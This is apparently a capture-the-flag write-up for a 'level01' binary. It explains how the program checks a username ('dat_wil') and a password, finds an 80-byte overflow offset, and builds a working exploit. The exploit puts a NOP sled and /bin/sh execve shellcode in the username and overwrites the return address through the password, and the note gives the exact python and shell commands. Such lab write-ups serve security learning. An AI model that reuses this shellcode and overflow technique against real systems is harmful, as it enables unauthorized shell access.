Here the program ask for a username on the stdin and then a password

We see that it gets the username 

   0x08048528 <+88>:    call   0x8048370 <fgets@plt>
   
   Then compare it's 7 first char in the func 
   
   0x0804852d <+93>:    call   0x8048464 <verify_user_name>
   
It compares it to "dat_wil" and if it's good, go to the next step which is a get of the password and same thing here, a comparison with "admin"


By using a simple string pattern we got an offset of 80 with the password buffer

What will do here is simply in the first input, which is the username, put "dat_wil" + SHELLCODE

It will compare the first 7 char, "dat_wil" is here so it will continue the flow of the program but we'll have our shellcode stored in the username buffer

As 2nd parameter when it ask for the password, we'll simply overflow the function with 80*'\x90' NOP instruction then put the address of the shellcode

We have space in the buffer username so to avoid to be precise I put some '\x90' between the "dat_wil" and the shellcode to jump to an address around both.

username = 'dat_wil' + '\x90' * 20 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'
password = '\x90'*80 + '\x08\x04\xa0\x48'[::-1]

 python -c "print('dat_wil' + '\x90' * 20 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' + '\n' + '\x90'*80 + '\x08\x04\xa0\x48'[::-1])" > /tmp/exploit
 
 cat /tmp/exploit - | ./level01
